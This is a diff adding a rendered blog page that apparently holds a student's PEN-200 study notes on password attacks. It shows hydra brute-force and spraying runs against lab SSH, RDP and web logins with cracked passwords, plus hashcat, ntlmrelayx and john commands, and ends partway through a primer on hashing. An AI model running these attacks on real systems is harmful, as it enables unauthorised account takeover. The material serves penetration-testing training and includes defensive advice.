@@ -1,0 +1,1470 @@
+
+    <article class="git-panel git-file-panel" data-git-panel-section="blob">
+      <header class="git-file-header">
+        <h4 class="git-file-title">password-attacks.html</h4>
+        <div class="git-file-meta">
+          <span>67 KB</span>
+          <span>site-output/blog/password-attacks.html</span>
+        </div>
+      </header>
+      <div class="git-file-body">
+        <pre><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+  &lt;title&gt;Core – PEN-200 Module 15 — Password Attacks That Still Work&lt;/title&gt;
+
+  
+    &lt;!-- head partial (auto-generated) --&gt;
+
+&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=5.0, viewport-fit=cover&quot;/&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.googleapis.com&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot; crossorigin&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Audiowide&amp;family=Orbitron:wght@400..900&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Rubik+Iso&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;../assets/static/style/cm.css&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.googleapis.com&quot;&gt;
+&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot; crossorigin&gt;
+&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Syne+Mono&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;../assets/static/js/cm.js&quot;&gt;&lt;/script&gt;
+&lt;script src=&quot;https://unpkg.com/htmx.org@1.9.12&quot; defer&gt;&lt;/script&gt;
+&lt;link rel=&quot;manifest&quot; href=&quot;../site.webmanifest&quot;/&gt;
+&lt;link rel=&quot;icon&quot; type=&quot;image/x-icon&quot; href=&quot;../assets/static/img/favicon.ico&quot;&gt;
+
+  
+
+  
+  
+  
+  
+  
+  
+  
+  
+  
+  
+
+&lt;/head&gt;
+&lt;body class=&quot;cm-body blog-page&quot;&gt;
+  &lt;header&gt;
+    &lt;div class=&quot;container header-container&quot;&gt;
+      
+      
+      
+        &lt;a href=&quot;../index.html&quot; class=&quot;logo-link&quot;&gt;
+          &lt;img src=&quot;../assets/static/img/not-dead.webp&quot; alt=&quot;Core Logo&quot; class=&quot;logo&quot;&gt;
+        &lt;/a&gt;
+      
+      
+      
+        &lt;button type=&quot;button&quot; class=&quot;nav-toggle&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+          &lt;svg width=&quot;24&quot; height=&quot;24&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot;&gt;
+            &lt;path d=&quot;M3 7h18M3 12h18M3 17h18&quot; /&gt;
+          &lt;/svg&gt;
+        &lt;/button&gt;
+        &lt;nav class=&quot;main-nav&quot;&gt;
+          &lt;ul class=&quot;nav-links&quot;&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;../index.html&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;../blog.html&quot;&gt;Blog&lt;/a&gt;&lt;/li&gt;
+            
+          &lt;/ul&gt;
+        &lt;/nav&gt;
+      
+    &lt;/div&gt;
+  &lt;/header&gt;
+
+  &lt;main class=&quot;blog-container blog-post-view&quot;&gt;
+    &lt;div class=&quot;blog-article-shell&quot;&gt;
+      &lt;a class=&quot;blog-back-link&quot; href=&quot;../blog.html&quot;&gt;
+        &lt;svg viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; aria-hidden=&quot;true&quot;&gt;
+          &lt;path d=&quot;M15 18l-6-6 6-6&quot; /&gt;
+        &lt;/svg&gt;
+        Back to Chaos &amp;amp; Majesty Journal
+      &lt;/a&gt;
+      
+
+&lt;article class=&quot;blog-article-body&quot; data-slug=&quot;password-attacks&quot;&gt;
+  &lt;header class=&quot;blog-article-header&quot;&gt;
+    &lt;h1 class=&quot;blog-article-title&quot;&gt;PEN-200 Module 15 — Password Attacks That Still Work&lt;/h1&gt;
+    &lt;p class=&quot;blog-article-meta&quot;&gt;
+      
+        &lt;span&gt;Sep 29, 2023&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;84 min read&lt;/span&gt;
+      
+      
+        &lt;span aria-hidden=&quot;true&quot;&gt;•&lt;/span&gt;
+        &lt;span&gt;m4xx3d0ut&lt;/span&gt;
+      
+    &lt;/p&gt;
+  &lt;/header&gt;
+
+  
+
+  &lt;div class=&quot;blog-article-content&quot;&gt;
+    &lt;h2&gt;TLDR;&lt;/h2&gt;
+&lt;p&gt;Credential attacks blend automation with context. The lab notes captured wordlists, hashcat rule tweaks, and relay nuances; this revision makes them explicit.&lt;/p&gt;
+&lt;h3&gt;Online Guessing&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Build user lists from LDAP, email headers, and OSINT; normalise casing and remove duplicates.&lt;/li&gt;
+&lt;li&gt;Respect lockout thresholds: throttle attempts (&lt;code&gt;hydra -t 4 -W 30&lt;/code&gt;) and log timings.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;# SSH brute force with delays
+hydra -L users.txt -P rockyou.txt -s 22 -V -W 15 ssh://192.168.119.37
+
+# HTTP form spraying (Burp → Intruder capture first)
+ffuf -X POST -d &amp;quot;username=FUZZ&amp;amp;password=Winter2024!&amp;quot; -H &amp;quot;Content-Type: application/x-www-form-urlencoded&amp;quot; -w users.txt -u https://portal.acme.local/login -mr &amp;quot;Welcome&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Capture successes with timestamp, source IP, account type, and password reuse indicators.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Hash Capture &amp;amp; Cracking&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Dump credentials responsibly (&lt;code&gt;secretsdump.py&lt;/code&gt;, &lt;code&gt;impacket&lt;/code&gt; relays, DPAPI extraction). Store raw files in encrypted containers.&lt;/li&gt;
+&lt;li&gt;Use targeted wordlists plus rules:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;hashcat -m 1000 hashes/ntlm.txt wordlists/rockyou.txt -r rules/dive.rule --session ntlm
+hashcat -m 5600 hashes/netntlmv2.txt wordlists/top20k.txt -r rules/leetspeak.rule --status
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Leverage masks (&lt;code&gt;?u?l?l?l?d?d?d&lt;/code&gt;) for seasonal patterns. Document masks used and cracked credentials for reporting.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Relay &amp;amp; Pass-The-Hash&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Responder / Inveigh&lt;/strong&gt; to capture Net-NTLMv2.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;ntlmrelayx.py&lt;/strong&gt; to target SMB/HTTP services lacking signing or enforcing Extended Protection.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;python3 ntlmrelayx.py -tf targets.txt -smb2support --escalate-user supportsvc
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;After success, enumerate new privileges (&lt;code&gt;net localgroup administrators&lt;/code&gt;, &lt;code&gt;Get-ADGroupMember&lt;/code&gt;). Note lateral movement paths you unlocked.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;SSH Key &amp;amp; Password Manager Workflows&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Convert private keys: &lt;code&gt;ssh2john id_rsa &amp;gt; ssh.hash&lt;/code&gt;, crack with &lt;code&gt;john --wordlist=... --rules=KoreLogic&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;For KeePass/Password Safe artifacts, use &lt;code&gt;keepass2john&lt;/code&gt; and mention key-file requirements in the notes.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Operational Hygiene&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Segregate cracked credentials by sensitivity (user, service, privileged) and update the engagement tracker.&lt;/li&gt;
+&lt;li&gt;Purge loot post-engagement per policy; document deletion commands for audit.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Defensive Recommendations&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Enforce MFA, disable legacy auth protocols, and deploy account lockout alerting.&lt;/li&gt;
+&lt;li&gt;Rotate captured credentials immediately; note whether the client already has PAM or SSPR solutions to support this.&lt;/li&gt;
+&lt;li&gt;Roll out LAPS / gMSA to prevent local admin password reuse.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Module 15 proves passwords remain the weakest link—apply these workflows carefully, log everything, and hand defenders a prioritized remediation list.&lt;/p&gt;
+&lt;h2&gt;Working Notes... In Graphic Detail...&lt;/h2&gt;
+&lt;h3&gt;Password Attacks&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;Attacking network services logins.&lt;/li&gt;
+&lt;li&gt;Password Cracking Fundamentals.&lt;/li&gt;
+&lt;li&gt;Working with Password Hashes.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;15.1 Attacking Network Services Logins&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Attack SSH and RDP logins.&lt;/li&gt;
+&lt;li&gt;Attack HTTP POST login forms.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;SSH and RDP&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;Execute a Dictionary attack against SSH and RDP.&lt;/li&gt;
+&lt;li&gt;Tool; THC Hydra.&lt;ul&gt;
+&lt;li&gt;Wordlist; &lt;code&gt;rockyou.txt&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Contains 14M passwords.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;As an example we will brute our first test VM.  We will attack ssh on port 2222 and attempt to determine the password for the user &lt;code&gt;george&lt;/code&gt;.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Confirm the target is running SSH on port 2222.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sudo nmap -sV -p 2222 192.168.241.201            
+[sudo] password for operator: 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 09:12 PDT
+Nmap scan report for 192.168.241.201
+Host is up (0.079s latency).
+
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The output indicates that SSH is open.&lt;/li&gt;
+&lt;li&gt;Let&amp;#39;s assume through information gathering we already discovered the &lt;code&gt;george&lt;/code&gt; user.&lt;ul&gt;
+&lt;li&gt;*The format of the user name may suggest that the company uses the first name for account names. This information can assist us later to further our efforts.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Once we have prepared the &lt;code&gt;rockyou.txt&lt;/code&gt; by decompressing it.&lt;ul&gt;
+&lt;li&gt;attack with a single username &lt;code&gt;-l george&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;specify the port with &lt;code&gt;-s 2222&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;set password list with &lt;code&gt;-P /usr/share/wordlists/rockyou.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;define target with &lt;code&gt;ssh://192.168.241.201&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.241.201
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 09:34:36
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.241.201:2222/
+[2222][ssh] host: 192.168.241.201   login: george   password: chocolate
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 09:34:46
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We have successfully discovered a valid login for &lt;code&gt;george&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;The dictionary attack worked because the password was contained in the &lt;code&gt;rockyou.txt&lt;/code&gt; wordlist.&lt;/li&gt;
+&lt;li&gt;If we don&amp;#39;t have a valid username.&lt;/li&gt;
+&lt;li&gt;We would use enumeration and information gathering techniques.&lt;/li&gt;
+&lt;li&gt;We can also attack built in accounts.&lt;/li&gt;
+&lt;li&gt;On Linux &lt;code&gt;root&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;On Win &lt;code&gt;Administrator&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In the next example we will use the &lt;strong&gt;password spraying&lt;/strong&gt; technique to use a single password against multiple usernames.
+*This technique is extremely viable due to the number of ways we can gain access to passwords.  We may gain access to credentials using one of the techniques described later in this module, find the stored in plain text, or through online leak DBs.  Services like ScatteredSecrets track password leaks, compromise, and sell plaintext passwords.  This can be beneficial during a pentest, but we must assure we don&amp;#39;t violate the ToS of these services and only use passwords in cooperation with the legal owner.  Always review the service to determine if it is operating legally.  As an example, WeLeakInfo was recently seized by the FBI and US DoJ for alleged illegal activity.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;We will demonstrate this by executing a password spray against out second test VM.&lt;/li&gt;
+&lt;li&gt;Using &lt;code&gt;hydra&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Set the list of usernames &lt;code&gt;-L /usr/share/wordlists/dirb/others/names.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Contains over 8000 usernames.&lt;/li&gt;
+&lt;li&gt;Set single password &lt;code&gt;-p &amp;quot;SuperS3cure1337#&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Using RDP proto &lt;code&gt;rdp://192.168.241.202&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hydra -L name.lst -p &amp;quot;SuperS3cure1337#&amp;quot; rdp://192.168.241.202 
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 13:35:00
+[WARNING] rdp servers often don&amp;#39;t like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 2 tasks per 1 server, overall 2 tasks, 2 login tries (l:2/p:1), ~1 try per task
+[DATA] attacking rdp://192.168.241.202:3389/
+[3389][rdp] host: 192.168.241.202   login: daniel   password: SuperS3cure1337#
+[3389][rdp] host: 192.168.241.202   login: justin   password: SuperS3cure1337#
+1 of 1 target successfully completed, 2 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 13:35:12
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;In this case we discover two usernames with the password we discovered in the DB leak.&lt;/li&gt;
+&lt;li&gt;This can reveal users with the same password across multiple systems.&lt;/li&gt;
+&lt;li&gt;We should always try to leverage every password we discover by spraying them across target systems.&lt;/li&gt;
+&lt;li&gt;Always use caution with broad-range attacks.&lt;/li&gt;
+&lt;li&gt;Dict attacks generate a lot of noise.&lt;/li&gt;
+&lt;li&gt;Huge amounts of traffic can bring down a network.&lt;/li&gt;
+&lt;li&gt;Basic brute force protection programs can lock user accounts after 3 attempts.&lt;/li&gt;
+&lt;li&gt;Possibly locking users out of critical production systems IRL pentest.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;HTTP POST Login Form&lt;/h5&gt;
+&lt;p&gt;During most assessments we will face a web service, often requiring login before we can interact.  If this is the only present vector and default creds fail, we should consider a dict attack.&lt;/p&gt;
+&lt;p&gt;Most web services have a default user account, i.e. &lt;code&gt;admin&lt;/code&gt;, which we can use in the dict attack to increase our odds of success while also reducing attack duration.&lt;/p&gt;
+&lt;p&gt;In this example, we will perform a dict attack on the login form of a TinyFileManager app.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Start with the app docs.&lt;/li&gt;
+&lt;li&gt;TinyFileManager.&lt;/li&gt;
+&lt;li&gt;Includes 2 def user accounts.
+    - &lt;code&gt;admin&lt;/code&gt;
+    - &lt;code&gt;user&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;We will target &lt;code&gt;user&lt;/code&gt; with the &lt;code&gt;rockyou.txt&lt;/code&gt; wordlist using &lt;code&gt;hydra&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;To target HTTP POST with Hydra we need 2 pieces of info.&lt;/li&gt;
+&lt;li&gt;The POST data.&lt;/li&gt;
+&lt;li&gt;Containing the request body which specifies username and password.&lt;ul&gt;
+&lt;li&gt;We must also capture a failed login attempt so Hydra can differentiate between successful and failed login attempts.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Use Burp to intercept a login attempt.&lt;/li&gt;
+&lt;li&gt;Record the request body in the POST data.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-http&quot;&gt;POST / HTTP/1.1
+Host: 192.168.241.201
+Content-Length: 23
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.241.201
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.241.201/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: filemanager=u1k19t8td1q7fsbpmjjb91g6a5
+Connection: close
+
+fm_usr=test&amp;amp;fm_pwd=test
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;POST data.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;fm_usr=test&amp;amp;fm_pwd=test&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;We find a text string that appears in a failed login attempt GET.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Login failed. Invalid username or password&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;In more complex web applications, we may need to dig deeper into the request and response or even inspect the source code of the login form to isolate a failed login indicator, but this is out of the scope of this Module.&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;Now we can set the options of our Hydra attack.&lt;/li&gt;
+&lt;li&gt;Set user &lt;code&gt;-l&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Set wordlist &lt;code&gt;-P&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Set target IP without protocol.&lt;ul&gt;
+&lt;li&gt;POST form arg &lt;code&gt;http-post-form&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Accepts 3 colon-delimited fields.
+    - Location of login form &lt;code&gt;index.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Request body providing username and password.&lt;/li&gt;
+&lt;li&gt;Failed login identifier aka the &lt;strong&gt;condition string&lt;/strong&gt;.
+- The condition string is searched for in the response.
+- Try to avoid keywords like &lt;code&gt;password&lt;/code&gt; or &lt;code&gt;username&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Modify the condition string as needed.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Launch our Hydra attack.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.241.201 http-post-form &amp;quot;/index.php:fm_usr=user&amp;amp;fm_pwd=^PASS^:Login failed. Invalid&amp;quot;
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 18:34:55
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-post-form://192.168.241.201:80/index.php:fm_usr=user&amp;amp;fm_pwd=^PASS^:Login failed. Invalid
+[STATUS] 66.00 tries/min, 66 tries in 00:01h, 14344333 to do in 3622:19h, 16 active
+[80][http-post-form] host: 192.168.241.201   login: user   password: 121212
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 18:37:21
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Our attack was succesful.&lt;/li&gt;
+&lt;li&gt;Password of &lt;code&gt;user&lt;/code&gt; is &lt;code&gt;121212&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;We can confirm by logging in.&lt;/li&gt;
+&lt;li&gt;Always be aware &lt;em&gt;dict attacks make a lot of noise!&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;If present, a WAF would block.&lt;/li&gt;
+&lt;li&gt;Other brute force mitigations would as well.&lt;/li&gt;
+&lt;li&gt;Fail2ban.&lt;ul&gt;
+&lt;li&gt;This is a highly effective vector, as web apps are no often protected with such measures.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Dict attacks can be highly effective if we begin with known info and take possible countermeasures into consideration.&lt;/p&gt;
+&lt;h6&gt;Excersizes&lt;/h6&gt;
+&lt;p&gt;The web page on VM #2 is password protected. Use Hydra to perform a password attack and get access as user admin. Once you have identified the correct password, enter it as answer to this exercise.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;# Enumerate the running web server
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sudo nmap -sV -p 80 192.168.241.201
+[sudo] password for operator: 
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 19:05 PDT
+Nmap scan report for 192.168.241.201
+Host is up (0.075s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41
+Service Info: Host: 172.25.0.2
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds
+
+
+# Craft attack using http-get method for Apache HTTP GET basic authentication
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 80 -f 192.168.241.201 http-get /
+Hydra v9.5 (c) 2023 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-30 19:12:50
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking http-get://192.168.241.201:80/
+[80][http-get] host: 192.168.241.201   login: admin   password: 789456
+[STATUS] attack finished for 192.168.241.201 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-30 19:12:54
+
+
+# Log in using admin:789456 success!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;15.2 Password Cracking Fundamentals&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Understand the fundamentals of password cracking.&lt;/li&gt;
+&lt;li&gt;Mutate wordlists.&lt;/li&gt;
+&lt;li&gt;Explain the basic password cracking methodology.&lt;/li&gt;
+&lt;li&gt;Attack password manager key files.&lt;/li&gt;
+&lt;li&gt;Attack the passphrase of SSH private keys.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Introduction to Encryption, Hashes and Cracking&lt;/h5&gt;
+&lt;p&gt;We will examine the difference between encryption and hash algorithms as well as discuss password cracking.  We will review two popular password cracking tools:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://hashcat.net/hashcat/&quot;&gt;Hashcat&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.openwall.com/john/&quot;&gt;John the Ripper (JtR)&lt;/a&gt;
+Finally we will calculate the time it takes to crack specific hashes!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Encryption&lt;/strong&gt; is a two-way function.  Data is scrambled, i.e. encrypted, and unscrambled, i.e. decrypted with at least one key.  The encrypted data is known as &lt;a href=&quot;https://en.wikipedia.org/wiki/Ciphertext&quot;&gt;ciphertext&lt;/a&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Symmetric-key_algorithm&quot;&gt;Symmetric Encryption&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Use the same key for enc and dec.&lt;/li&gt;
+&lt;li&gt;To send a message to another person both sides need to know the key (password)&lt;/li&gt;
+&lt;li&gt;If the key is sent via unsecure channel, it can be intercepted.&lt;/li&gt;
+&lt;li&gt;In this case, the attacker can use a MitM attack to access the encrypted message between the two.&lt;/li&gt;
+&lt;li&gt;With an intercepted key and access to the encrypted message the attacker can decrypt and read.&lt;/li&gt;
+&lt;li&gt;This introduces risk as the comm sec is reliant on knowledge of the key, which must be known by both sides before starting the comm.
+   - An example is &lt;a href=&quot;https://en.wikipedia.org/wiki/Advanced_Encryption_Standard&quot;&gt;AES (Advanced Encryption Standard)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Public-key_cryptography&quot;&gt;Asymmetric Encryption&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Uses distinct key pairs.&lt;/li&gt;
+&lt;li&gt;Private and public key.&lt;/li&gt;
+&lt;li&gt;To recieve a message the user shares their pub key with the comm partner.&lt;/li&gt;
+&lt;li&gt;The pub key is used for the comm partner to enc their message to the user.&lt;/li&gt;
+&lt;li&gt;Only the corresponding priv key can dec the message.
+- An example is &lt;a href=&quot;https://en.wikipedia.org/wiki/RSA_(cryptosystem)&quot;&gt;RSA (Rivest-Shamir-Adleman)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Hash&lt;/strong&gt;, or a digest, is the result of running var sized input data, such as a plaintext password, through a hash algorithm.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/SHA-1&quot;&gt;SHA1&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/MD5&quot;&gt;MD5&lt;/a&gt;
+The result is a fixed-len hexadecimal value which represents the original plaintext input.  Plaintext run through the same hash algo always produces the same hash, which is statistically unique.  The only exception being an extremely rare &lt;a href=&quot;https://en.wikipedia.org/wiki/Hash_collision&quot;&gt;hash collision&lt;/a&gt;, where two input values result in the same hash value.&lt;/li&gt;
+&lt;/ul&gt;
